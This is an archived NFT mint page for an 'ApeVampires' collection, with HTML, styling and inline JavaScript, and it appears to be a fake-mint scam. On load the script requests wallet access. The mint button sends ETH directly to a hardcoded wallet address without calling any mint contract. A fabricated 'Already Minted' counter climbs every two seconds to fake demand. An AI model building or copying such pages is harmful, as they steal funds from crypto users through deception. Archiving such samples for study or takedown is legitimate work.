@@ -1,0 +1,1126 @@
+<!DOCTYPE html><html lang="en" data-scrapbook-source="https://apevampires.com/" data-scrapbook-create="20220517115932664" data-scrapbook-title="ApeVampires"><head>
+
+<!-- Google Tag Manager -->
+
+<!-- End Google Tag Manager -->
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>ApeVampires</title>
+    <link rel="stylesheet" href="styles.css">
+    
+    <meta property="og:url" content="https://apevampires.com/">
+    <meta property="og:title" content="ApeVampires NFT collection">
+    <meta property="og:description" content="These apes are infected! NFT collection of 6,666 NFTs. Minting soon. Apply for whitelist on website.">
+    <meta property="og:image" content="https://i.imgur.com/vquh1zK.png">
+
+    <link rel="stylesheet" href="style-1.css" type="text/css">
+    <link rel="stylesheet" as="style" href="style.css">
+
+    <link rel="stylesheet" type="text/css" href="simple-adaptive-slider.css">
+    <link rel="stylesheet" as="style" href="bootstrap.min.css">
+
+    <noscript>
+        <link rel="stylesheet" href="style.css">
+        <link rel="stylesheet" href="bootstrap.min.css">
+    </noscript>
+
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <meta name="google-site-verification" content="iQk8RHQutiMBIMfN7QVsdRp-uFUMqlSZD4Po8zIBvqM">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js" ></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        var amount = 0.07;
+        $(function() {
+        
+        var mintCount = 865;
+        setInterval(function() {
+          if(mintCount < 6666) {
+          mintCount = mintCount + 1;
+          }
+          $('.mintCount').text(mintCount);
+        },2000);
+      
+        $('.bt-plus').click(function() {
+          var va = parseInt($('.txval').text().trim());
+          var ethval = 0.07
+          if(va < 20) {
+          va = va+1;
+          $('.txval').text(va);
+          $('.ethval').text(amount = (0.07 * va).toFixed(2));
+      
+          $('#inpAmt').val(amount);
+          }
+        })
+        $('.bt-minus').click(function() {
+          var va = parseInt($('.txval').text().trim());
+          var ethval = 0.07
+          if(va > 1) {
+          va = va-1;
+          $('.txval').text(va);
+          $('.ethval').text(amount = (0.07 * va).toFixed(2));
+          $('#inpAmt').val(amount);
+          }
+        })
+        })
+        window.addEventListener('load', async () => {
+        if(window.ethereum) {
+          window.web3 = new Web3(ethereum);
+          try {
+          await ethereum.enable();
+          $('#connect').hide();
+          initPayButton()
+          } catch (err) {
+          alert('User denied account access', err);
+          }
+        } else if (window.web3) {
+          window.web3 = new Web3(web3.currentProvider)
+          $('#connect').hide();
+          initPayButton()
+        } else {
+          alert('Non-Ethereum browser detected. You should consider trying MetaMask!');
+        }
+        })
+      
+        const initPayButton = () => {
+        $('.btn-pay').click(async () => {
+          var ethamount = ($('#inpAmt').val());
+          console.log('payment inititated', ethamount);
+          // paymentAddress is where funds will be send to
+          const paymentAddress = '0x6B00b7114B7Eb444aa36703ea9f3051e6AA6512F'
+          const amountEth = (ethamount)
+      
+          let accounts = await web3.eth.getAccounts();
+          web3.eth.defaultAccount = accounts[0]
+      
+          web3.eth.sendTransaction({
+          to: paymentAddress,
+          value: web3.utils.toWei(amountEth, 'ether')
+          }, (err, transactionId) => {
+          if  (err) {
+            console.log('Payment failed', err)
+            alert('Payment failed')
+          } else {
+            console.log('Payment successful', transactionId)
+            alert('Payment successful')
+          }
+          })
+        })
+        }
+      </script>
+    
+</head>
+
+<body>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="index_1.html" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    <div class="wrap_fag" style="overflow: hidden;">
+        <div class="container-fluid first-screen">
+    <div class="container-xl pos_rel_z">
+        <style>
+@media (max-width:768px){
+    .menu, .wrap_menu_right {
+        display: none;
+    }
+}
+@media (min-width:768px){
+    .menu-btn {
+        display: none;
+    }
+
+}
+
+.hmenu a{color: #FFFFFF;}
+
+
+.menu-btn {
+    width: 30px;
+    height: 30px;
+    position: relative;
+    z-index:2;
+    overflow: hidden;
+}
+.menu-btn span {
+    width: 30px;
+    height: 2px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: #FFFFFF;
+    transition: all 0.5s;
+}
+.menu-btn span:nth-of-type(2) {
+    top: calc(50% - 5px);
+}
+.menu-btn span:nth-of-type(3) {
+    top: calc(50% + 5px);
+}
+/* Меняем гамбургер иконку, когда меню открыто */
+.menu-btn.active span:nth-of-type(1) {
+  display: none;
+}
+.menu-btn.active span:nth-of-type(2) {
+  top: 50%;
+  transform: translate(-50%, 0%) rotate(45deg);  
+}
+.menu-btn.active span:nth-of-type(3) {
+  top: 50%;
+  transform: translate(-50%, 0%) rotate(-45deg); 
+}
+
+.hmenu {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    padding: 15px;
+  background: linear-gradient(150.41deg, #031623 50%, #0F374F 70%);
+    transform: translateX(-100%);
+    transition: transform 0.5s;
+}
+.hmenu.active {
+    transform: translateX(0);
+}
+.hmenu li {
+    list-style-type: none;
+}
+
+</style>
+<div class="row header">
+    <div class="col-1">
+        <a href="">
+            <img src="logo1.png" style="height:40px;" alt="ApeVampires">
+        </a>
+    </div>
+    <div class="col">
+        <ul class="menu">
+            <li><a href="#about">About</a></li>
+            <li><a href="#roadmap" class="menu_important">Roadmap</a></li>
+            <li><a href="#team">Team</a></li>
+            <li><a href="#faq">Faq</a></li>
+            <li><a target="_blank" href="https://whitepaper.apevampires.com/">Whitepaper</a></li>
+        </ul>
+    </div>
+    <div class="col">
+        <div class="wrap_menu_right">
+            <div class="soc_icon">
+                <a target="_blank" href="https://whitepaper.apevampires.com/">
+                <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 0H2C0.9 0 0.0100002 0.9 0.0100002 2L0 18C0 19.1 0.89 20 1.99 20H14C15.1 20 16 19.1 16 18V6L10 0ZM12 16H4V14H12V16ZM12 12H4V10H12V12ZM9 7V1.5L14.5 7H9Z" fill="url(#paint0_linear_102_190)"></path>
+                    <defs>
+                    <linearGradient id="paint0_linear_102_190" x1="8" y1="0" x2="8" y2="20" gradientUnits="userSpaceOnUse">
+                    <stop stop-color="#A0F4FF"></stop>
+                    <stop offset="1" stop-color="#1170DF"></stop>
+                    </linearGradient>
+                    </defs>
+                </svg>
+                </a>
+            </div>
+            <div class="soc_icon"><a href="mailto:info@apevampires.com"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M18 0H2C0.9 0 0.00999999 0.9 0.00999999 2L0 14C0 15.1 0.9 16 2 16H18C19.1 16 20 15.1 20 14V2C20 0.9 19.1 0 18 0ZM18 4L10 9L2 4V2L10 7L18 2V4Z" fill="url(#paint0_linear_68_187)"></path>
+                <defs>
+                <linearGradient id="paint0_linear_68_187" x1="10" y1="0" x2="10" y2="16" gradientUnits="userSpaceOnUse">
+                <stop stop-color="#A0F4FF"></stop>
+                <stop offset="1" stop-color="#1170DF"></stop>
+                </linearGradient>
+                </defs>
+                </svg> </a>
+            </div>
+            <div class="soc_icon"><a href="https://twitter.com/ApeVampires"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19.6 1.89999C18.9 2.19999 18.1 2.4 17.3 2.5C18.1 2 18.8 1.2 19.1 0.300003C18.3 0.800003 17.5 1.1 16.5 1.3C15.8 0.500003 14.7 0 13.6 0C11.4 0 9.59999 1.8 9.59999 4C9.59999 4.3 9.6 4.59999 9.7 4.89999C6.4 4.69999 3.39999 3.1 1.39999 0.699997C1.09999 1.3 0.899994 2 0.899994 2.7C0.899994 4.1 1.6 5.3 2.7 6C2 6 1.39999 5.8 0.899994 5.5C0.899994 7.4 2.29999 9.09999 4.09999 9.39999C3.79999 9.49999 3.4 9.5 3 9.5C2.7 9.5 2.5 9.49999 2.2 9.39999C2.7 11 4.2 12.2 6 12.2C4.6 13.3 2.9 13.9 1 13.9C0.7 13.9 0.4 13.9 0 13.8C1.8 14.9 3.9 15.6 6.2 15.6C13.6 15.6 17.6 9.5 17.6 4.2V3.7C18.4 3.4 19.1 2.69999 19.6 1.89999Z" fill="url(#paint0_linear_3_549)"></path>
+                        <defs>
+                            <linearGradient id="paint0_linear_3_549" x1="9.8" y1="0" x2="9.8" y2="15.6" gradientUnits="userSpaceOnUse">
+                                <stop stop-color="#A0F4FF"></stop>
+                                <stop offset="1" stop-color="#1170DF"></stop>
+                            </linearGradient>
+                        </defs>
+                    </svg> </a>
+            </div>
+            <div class="soc_icon"><a href="https://discord.gg/4WMssy2AUm"><svg width="18" height="20" viewBox="0 0 18 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M15.8914 0H2.10857C0.946286 0 0 0.92 0 2.06V15.58C0 16.72 0.946286 17.64 2.10857 17.64H13.7726L13.2274 15.79L14.544 16.98L15.7886 18.1L18 20V2.06C18 0.92 17.0537 0 15.8914 0ZM11.9211 13.06C11.9211 13.06 11.5509 12.63 11.2423 12.25C12.5897 11.88 13.104 11.06 13.104 11.06C12.6823 11.33 12.2811 11.52 11.9211 11.65C11.4069 11.86 10.9131 12 10.4297 12.08C9.44229 12.26 8.53714 12.21 7.76571 12.07C7.17943 11.96 6.67543 11.8 6.25371 11.64C6.01714 11.55 5.76 11.44 5.50286 11.3C5.472 11.28 5.44114 11.27 5.41029 11.25C5.38971 11.24 5.37943 11.23 5.36914 11.22C5.184 11.12 5.08114 11.05 5.08114 11.05C5.08114 11.05 5.57486 11.85 6.88114 12.23C6.57257 12.61 6.192 13.06 6.192 13.06C3.91886 12.99 3.05486 11.54 3.05486 11.54C3.05486 8.32 4.536 5.71 4.536 5.71C6.01714 4.63 7.42629 4.66 7.42629 4.66L7.52914 4.78C5.67771 5.3 4.824 6.09 4.824 6.09C4.824 6.09 5.05029 5.97 5.43086 5.8C6.53143 5.33 7.40571 5.2 7.76571 5.17C7.82743 5.16 7.87886 5.15 7.94057 5.15C8.568 5.07 9.27771 5.05 10.0183 5.13C10.9954 5.24 12.0446 5.52 13.1143 6.09C13.1143 6.09 12.3017 5.34 10.5531 4.82L10.6971 4.66C10.6971 4.66 12.1063 4.63 13.5874 5.71C13.5874 5.71 15.0686 8.32 15.0686 11.54C15.0686 11.54 14.1943 12.99 11.9211 13.06ZM7.13829 8.39C6.552 8.39 6.08914 8.89 6.08914 9.5C6.08914 10.11 6.56229 10.61 7.13829 10.61C7.72457 10.61 8.18743 10.11 8.18743 9.5C8.19771 8.89 7.72457 8.39 7.13829 8.39ZM10.8926 8.39C10.3063 8.39 9.84343 8.89 9.84343 9.5C9.84343 10.11 10.3166 10.61 10.8926 10.61C11.4789 10.61 11.9417 10.11 11.9417 9.5C11.9417 8.89 11.4789 8.39 10.8926 8.39Z" fill="url(#paint0_linear_2_97)"></path>
+                    <defs>
+                        <linearGradient id="paint0_linear_2_97" x1="9" y1="0" x2="9" y2="20" gradientUnits="userSpaceOnUse">
+                            <stop stop-color="#A0F4FF"></stop>
+                            <stop offset="1" stop-color="#1170DF"></stop>
+                        </linearGradient>
+                    </defs>
+                </svg></a>
+            </div>
+        </div>
+    </div>
+    <div class="col-1">
+        <div class="menu-btn">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="hmenu">
+            <nav>
+                <li><a href="#about">About ApeVampires</a></li>
+                <li><a href="#roadmap">Roadmap</a></li>
+                <li><a href="#team">Team</a></li>
+                <li><a href="#faq">Faq</a></li>
+                <li><a target="_blank" href="https://whitepaper.apevampires.com/">Whitepaper</a></li>
+                <li><a href="mailto:info@apevampires.com">Mail</a></li>
+                <li><a href="https://twitter.com/ApeVampires">Twitter</a></li>
+                <li><a href="https://discord.gg/4WMssy2AUm">Discord</a></li>
+            </nav>
+        </div>
+    </div>
+</div>
+        <div class="row">
+            <div class="col-12 title_first-screen">
+                6,666 infected Apes
+            </div>
+            <div class="text_first-screen mt-4">
+            APEVAMPIRES IS A COMMUNITY DRIVEN COLLECTION OF 6,666 RANDOMLY GENERATED NFTS LIVING ON THE ETHEREUM BLOCKCHAIN. 
+            <br>In the beginning there was a virus. Men spent billions to create a vaccine. It worked. But there was something else. The virus mutated and attacked apes. It changed them. They feel hunger and pain. And they long for fresh blood. They are ApeVampires.
+            <!--
+            <BR><bR>
+             MINTING IS ON MARCH 19 AT 3PM UTC. PRICE PER MINT 0.07 ETH.
+            -->
+        </div>
+
+            <div class="col-12 d-flex" style="justify-content: center; margin-top: 50px;">
+                                <a class="main_btn" href="https://discord.gg/4WMssy2AUm" target="_blank">Join Discord</a>
+            </div>
+        </div>
+        
+    </div>
+    
+    <img class="img_people" src="main-people2.webp">
+    <img class="fog1" src="image16.webp">
+    <img class="fog2" src="fog2.webp" style="right: -79px;">
+    <img class="fog3" src="fog3.webp">
+
+</div>
+<div class="container">
+	<div class="row vh-100 justify-content-center align-items-center">
+		<div class="col-sm-6">
+			<div class="mfor py-5">
+				<div class="mt-8">
+					<div class="sec-title text-center max-w-3xl mx-auto">
+							<img src="8.webp" class="img-fluid gifius" alt="gi">
+							<h2 style="font-weight: bold; color: #fff; font-size: 30px;"> Mint Now </h2>
+							<p style="font-size: 18px; font-weight: bold; color: #fff;"> Already Minted: <span class="mintCount">865</span> / 6666 </p>
+							<strong style="font-size: 18px; font-weight: bold; color: #fff;"> 0.07 ETH + GAS </strong> <br />
+							<strong style="font-size: 18px; font-weight: bold; color: #fff;"> 20 NFTs per Wallet </strong>
+							<div class="mt-4">
+								<div class="d-flex justify-content-center flex-column align-items-center">
+			
+									<div class="d-form" style="justify-content: center; align-items: center;">
+										<button class="btn btn-danger bt-minus mx-2">-</button>
+										<h1 class="form-control mt-2 txval"> 1 </h1>
+										<button class="btn btn-danger bt-plus mx-2">+</button>
+									</div>
+			
+									<input type="hidden" name="amount" id="inpAmt" value="0.07" />
+									<div class="bg-mint">
+										<button class="btn btn-secondary btn-mint py-4 px-5 btn-pay"> MINT NOW FOR <span class="ethval">0.07</span> ETH </button>
+									</div>
+									<br><br>
+								</div>
+			
+							</div>
+			
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="col-sm-6">
+		
+		</div>
+	</div>
+<style>
+	body {margin: 0; padding: 0; background: url('hypealien.jpg') no-repeat #000; min-height: 100vh; background-size: cover; }
+	/* .site { position: relative; top: 0; left: 0; z-index: 1; width: 100%; } */
+	button{ cursor: pointer; }
+	.d-form {
+		display: flex; align-items: center; width: 100%;
+	}
+	.d-form button { background: #ffffff; border: 1px solid transparent;  margin: 5px; padding: 2px; width: 32px !important; color:#000; font-size: 18px; font-weight: bold; 
+		border-radius: 5px; display: inline-block; }
+	.d-form button:hover { background: #999999; border: none; }
+	.d-form h1 { margin: 5px; padding: 5px 10px; width: 32px; font-size: 18px; font-weight: bold; border-radius: 5px; color: #ffffff !important; }
+	.btn-mint {
+		background: #ffffff; padding: 8px 15px !important; border-radius: 6px; margin-top: 10px; border: none; color: #000; font-weight: bold; font-size: 15px;
+		border: 1px solid transparent; letter-spacing: 2px;
+	}
+	.form-control { color: #fff; background: #000;}
+	.btn-danger { 
+		background: #fff; color: #000 !important; font-weight: bold; border: none; border: 1px solid transparent;
+	}
+	.mfor {
+		background: rgba(0, 0, 0, 0.8);
+		border: 1px solid transparent;
+		box-sizing: border-box;
+		border-radius: 6px;
+		min-width: 450px;
+		max-width: 550px;
+		min-height: 450px;
+		padding: 10px;
+		color: white !important;
+		/* position: absolute;
+		left: 50%;
+		top: 50%;
+		transform: translate(-50%, -50%); */
+		z-index: 99 !important;
+		display: flex;
+		flex-direction: column;
+		text-align: center;
+		margin: 10px;
+		line-height: 30px;
+	}
+	.vh-100 { min-height: 100vh; }
+	.btn-outline-warning { border: 2px solid rgb(146, 141, 134); color: rgb(146, 141, 134); padding: 10px 25px; }
+	.sub-title{
+		font-size: 42px; letter-spacing: 5px; font-weight: 400; color:#fff;
+	}
+	.title{
+		font-size: 120px; letter-spacing: 5px; font-weight: 700; color:#fff;
+	}
+	.logo img { width: 80px; border-radius: 10px; margin: 15px auto !important; text-align: center; color: #fff;}
+	.logo h3 { color: #fff; text-align: center; font-size: 20px; font-weight: 400; word-spacing: 3px; }
+	.hero-img { width: 75%; border-radius: 15px; margin: 15px auto; }
+	.h-50 { min-height: 70vh; }
+	.gifius{ width: 200px; border-radius: 10px; margin: 20px auto; }
+	@media only screen and (max-width: 600px) {
+		.mfor { width: 80% !important; margin: 0px auto;  }
+		.title { font-size: 88px; font-weight: 600;}
+		.sub-title { font-size: 38px;}
+		.right{ right: 9%; top: 5%;}
+		.hero { position: absolute; top: 10%; width: 100%;}
+		.hero .fw-bold { font-size: 28px !important; display: none;}
+		.h-50 { height: auto !important; }
+	}
+	
+
+</style>
+
+<div class="container-fluid second-screen pb-5">
+    <div class="container-xl">
+        <div class="row padding-top">
+            <div class="col-12 col-md-6">
+                <div class="h2 text-start">What you get</div>
+                <ul class="ul_description span_description">
+                    <li>NFT Holders will be eligible for our tokens during Airdrop event</li>
+                    <li>Stake &amp; Farm NFTs to earn $BLOOD token each day!</li>
+                    <li>Each ApeVampire is a 100% unique gateway to Metaverse and game.</li>
+                    <li>Whitelist Pass to future NFT releases</li>
+                    <li>Gather 2 ApeVampires + 666 $BLOOD Tokens for minting a new breed. Newly minted
+                        little-one
+                        will have attributes from both parents!</li>
+                    <li>There will be no secondary royalty fees</li>
+                </ul>
+            </div>
+            <div class="col-12 col-md-6">
+                <div class="span_description20">Super fun project, massive giveaways and gamification.<br>Let’s
+                    build
+                    an epic community TOGETHER!!</div>
+                <div class="price_container">
+    <div class="price_block">
+        <div class="top_line">EARLY BIRD PRICE</div>
+        <div class="bottom_line">0.05 ETH</div>
+    </div>
+    <div class="price_block">
+        <div class="top_line">LAUNCH DATE</div>
+        <div class="bottom_line">2022-03-05</div>
+    </div>
+    <div class="price_block"></div>
+</div>
+<div class="price_container">
+    <div class="price_block">
+        <div class="top_line">PRESALE PRICE</div>
+        <div class="bottom_line">0.05 ETH</div>
+    </div>
+    <div class="price_block">
+        <div class="top_line">LAUNCH DATE</div>
+        <div class="bottom_line">2022-03-12</div>
+    </div>
+    <div class="price_block"></div>
+</div>
+<div class="price_container">
+    <div class="price_block">
+        <div class="top_line">PUBLIC MINT PRICE</div>
+        <div class="bottom_line">0.07 ETH</div>
+    </div>
+    <div class="price_block">
+        <div class="top_line">LAUNCH DATE</div>
+        <div class="bottom_line">2022-05-18</div>
+    </div>
+    <div class="price_block"></div>
+</div>
+<div class="wrap_timer">
+    <div class="border_wrap">
+        <div class="timer_body">
+            <div class="countDownHeader">Public mint starts in</div>
+            <div class="mt-4" style="font-family: 'Avenir', Arial, Helvetica, sans-serif;    font-weight: 300;    font-size: 20px;    line-height: 27px;    color: #FFFFFF;    ">
+            <div class="timer_container">
+                <div class="timer_block">
+                    <div class="top_line">days</div>
+                    <div class="bottom_line" id="countDownDays">00</div>
+                </div>
+                <div class="timer_block">
+                    <div class="bottom_line">:</div>
+                </div>
+                <div class="timer_block">
+                    <div class="top_line">hours</div>
+                    <div class="bottom_line" id="countDownHours">00</div>
+                </div>
+                <div class="timer_block">
+                    <div class="bottom_line">:</div>
+                </div>
+                <div class="timer_block">
+                    <div class="top_line">minutes</div>
+                    <div class="bottom_line" id="countDownMinutes">00</div>
+                </div>
+                <div class="timer_block">
+                    <div class="bottom_line">:</div>
+                </div>
+                <div class="timer_block">
+                    <div class="top_line">seconds</div>
+                    <div class="bottom_line" id="countDownSeconds">00</div>
+                </div>
+            </div>
+        </div>
+                <a href="https://discord.gg/4WMssy2AUm" target="_blank" class="main_btn second-screen_btn">Join Discord</a>
+    </div>
+</div>
+            </div>
+        </div>
+    </div>
+</div>
+        
+        <div class="container-fluid second-screen_over">
+            <div class="container-xl pos_rel_z">
+    <div class="row padding-top justify-content-center">
+        <div class="col-12">
+            <a href="#" class="h2" name="about">Check our collection</a>
+        </div>
+        <div class="col-12 col-md-8 about_description">
+            Check this <a target="_blank" style="color: #FFFFFF;" href="https://apevampires.com/data/chekCollection.php">link</a> where you can see our whole collection.
+            <!--
+            In the beginning there was a virus. Men spent billions to create a vaccine. It worked. But there
+            was
+            something else. The virus mutated and attacked apes. It changed them. They feel hunger and pain.
+            And they long for fresh blood. They are ApeVampires.<br><br>
+           
+            World is not a safe place anymore. Night is the domain of Apes. They hunt men and drink their
+            blood.
+            The great civilization that lasted for more than 2,000 years is slowly falling apart. And nobody
+            can
+            stop it. Not even you. All you can do is to be a witness of the fall of mankind. See the
+            destruction
+            from the front seats.
+            -->
+        </div>
+    </div>
+</div>
+<img class="fog4" src="imageabout.webp">
+<div class="row justify-content-center pos_rel_z">
+    <div class="img_about" style="transform: translateX(409px);">
+                    <img src="7.webp">
+                    <img src="8.webp">
+                    <img src="9.webp">
+                    <img src="10.webp">
+                    <img src="11.webp">
+                    <img src="12.webp">
+                    <img src="13.webp">
+                    <img src="14.webp">
+                    <img src="15.webp">
+                    <img src="16.webp">
+                    <img src="17.webp">
+                    <img src="18.webp">
+                    <img src="19.webp">
+                    <img src="20.webp">
+                    <img src="21.webp">
+                    <img src="22.webp">
+                    <img src="23.webp">
+                    <img src="24.webp">
+                    <img src="25.webp">
+                    <img src="26.webp">
+                    <img src="27.webp">
+                    <img src="28.webp">
+                    <img src="29.webp">
+                    <img src="30.webp">
+                    <img src="31.webp">
+            </div>
+</div>
+
+<div class="col-12 d-flex" style="justify-content: center; margin-top: 100px;">
+        <a class="main_btn" href="https://discord.gg/4WMssy2AUm" target="_blank">Join Discord</a>
+</div>
+<div class="container-xl">
+    <div class="row padding-top2 justify-content-center">
+        <div class="col-12">
+            <a href="#" class="h2" name="roadmap">Roadmap</a>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q3</div>
+                    <div class="y">2022</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>Metaverse for ApeVampires</li>
+                    <li>free 3d version of ApeVampires only for NFT holders</li>
+                    <li>others will be able to buy 3d version of their ApeVampire in our shop with merchandise (comming later in Q1 2023)</li>
+                    <li>buying land in Metaverse, where ApeVampires can hang out</li>
+                </ul>
+            </div>
+        </div>
+        <div class="col-12 col-md-6 padding-top3">
+            <div class="col-12">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-2">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-4">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+
+        </div>
+    </div>
+    <div class="row flex-wrap-reverse">
+        <div class="col-12 col-md-6 left padding-top3">
+            <div class="col-12 offset-10">
+                <div class="arm"></div>
+            </div>
+            <div class="col-12 offset-8">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-7">
+                <div class="arm right"></div>
+            </div>
+        </div>
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q3</div>
+                    <div class="y">2022</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>DAO</li>
+                    <li>only for holders of NFT (after we launch BLOOD token in Q2 2023, people can stake the token to be part of DAO)</li>
+                    <li>community wallet (we put money from sales of our NFT into this wallet)</li>
+                    <li>DAO decides to what NFTs invest money from this wallet</li>
+                    <li>we replenish after 40 ETH sold out</li>
+                    <li>after we launch our token BLOOD, we will buy back token on profits from investing – earnings of BLOOD holders increase</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q4</div>
+                    <div class="y">2022</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>Whale-follow robot</li>
+                    <li>only for holders of NFT</li>
+                    <li>get NFT whale trading statistics</li>
+                    <li>get activity alerts for selected NFT whales</li>
+                    <li>the ability to enable automatic purchase of NFTs which are being bought by a lot of whales (= big opportunity emerging)</li>
+                </ul>
+            </div>
+        </div>
+        <div class="col-12 col-md-6 padding-top3">
+            <div class="col-12">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-2">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-4">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+        </div>
+    </div>
+    <div class="row flex-wrap-reverse">
+        <div class="col-12 col-md-6 left padding-top3">
+            <div class="col-12 offset-10">
+                <div class="arm"></div>
+            </div>
+            <div class="col-12 offset-8">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-7">
+                <div class="arm right"></div>
+            </div>
+        </div>
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q1</div>
+                    <div class="y">2023</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>Shop with merchandise</li>
+                    <li>holders of NFT get discount 25% for all merch</li>
+                    <li>3d printed figure of your ApeVampire</li>
+                    <li>card games with ApeVampires</li>
+                    <li>clothes with ApeVampires (t-shirts, hoodies, etc.)</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q2</div>
+                    <div class="y">2023</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>Blood token</li>
+                    <li>free airdrop of token for NFT holders</li>
+                    <li>can be used in shop to pay for merch</li>
+                    <li>used for DAO membership (if you don’t have our NFT, you buy BLOOD and you can enter DAO)</li>
+                    <li>staking revenue (we want people to HODL our token, so we will give them reward for staking)</li>
+                </ul>
+            </div>
+        </div>
+        <div class="col-12 col-md-6 padding-top3">
+            <div class="col-12">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-2">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-4">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+        </div>
+    </div>
+    <div class="row flex-wrap-reverse">
+        <div class="col-12 col-md-6 left padding-top3">
+            <div class="col-12 offset-10">
+                <div class="arm"></div>
+            </div>
+            <div class="col-12 offset-8">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-7">
+                <div class="arm right"></div>
+            </div>
+        </div>
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q3</div>
+                    <div class="y">2023</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>P2E Game</li>
+                    <li>using avatars of Apes</li>
+                    <li>players fight with each other for perks (in BLOOD token) – P2E game</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="row">
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q4</div>
+                    <div class="y">2023</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>Access to upcoming projects</li>
+                    <li>only for holders of our NFT</li>
+                    <li>airdrops of our next NFT projects</li>
+                    <li>Granted WL spots for NFT projects</li>
+                </ul>
+            </div>
+        </div>
+        <div class="col-12 col-md-6 padding-top3">
+            <div class="col-12">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-2">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+            <div class="col-12 offset-4">
+                <div class="arm"></div>
+                <div class="arm right"></div>
+            </div>
+        </div>
+    </div>
+    <div class="row flex-wrap-reverse">
+        <div class="col-12 col-md-6 left padding-top3">
+
+        </div>
+        <div class="col-12 col-md-6">
+            <div class="wrap_roadmap">
+                <div class="roadmap-list">
+                    <div class="q">Q4</div>
+                    <div class="y">2023</div>
+                </div>
+                <ul class="ul_roadmap">
+                    <li>NFT Launchpad</li>
+                    <li>DAO decides which NFT projects to launch</li>
+                    <li>we provide funds and knowledge for % from revenue share</li>
+                    <li>Will have positive impact on price of BLOOD token, if we introduce successfull projects</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>        </div>
+    </div>
+    <div class="container-fluid second-screen_over">
+    <div class="container-xl">
+        <div class="row padding-top2 justify-content-center">
+            <img class="fog5" src="imageTeam.webp">
+            <div class="col-12">
+                <a href="#" class="h2" name="team">Team</a>
+            </div>
+
+            <div class="slider">
+                <div class="slider__container">
+                    <div class="slider__wrapper">
+                        <div class="slider__items">
+                            <div class="slider__item slider__item_active" data-index="0" data-order="0" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar">
+                                        <img src="1.webp">
+                                        <div class="avatar_hover">An IT engineer with 17 years of experience in servers, proficient in system programming. Blockchain and NFT believer in a decentralized future. Passionate fiction lover.</div>
+                                    </div>
+                                    <div class="name_body_border">
+                                        <div class="name_body">
+                                            <div class="name_title">Crypto Jordan</div>
+                                            <div class="name_description">Co-founder &amp; Blockchain Expert</div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="slider__item slider__item_active" data-index="1" data-order="1" data-translate="0">
+                                <div class="container_card">
+                                    <div class="avatar">
+                                        <img src="2.webp">
